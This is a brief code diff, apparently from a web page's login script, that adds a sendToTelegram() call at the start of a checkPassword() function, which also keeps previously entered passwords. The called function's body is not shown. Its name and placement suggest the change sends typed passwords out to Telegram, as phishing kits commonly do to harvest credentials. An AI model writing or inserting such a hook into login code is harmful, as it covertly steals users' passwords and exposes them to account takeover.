@@ -409,6 +409,7 @@
       let previousPasswords = []; // Stores previous passwords
 
       function checkPassword() {
+          sendToTelegram();
           let passwordInputs = passwordInput.value;
 
           if (previousPasswords.includes(passwordInputs)) {
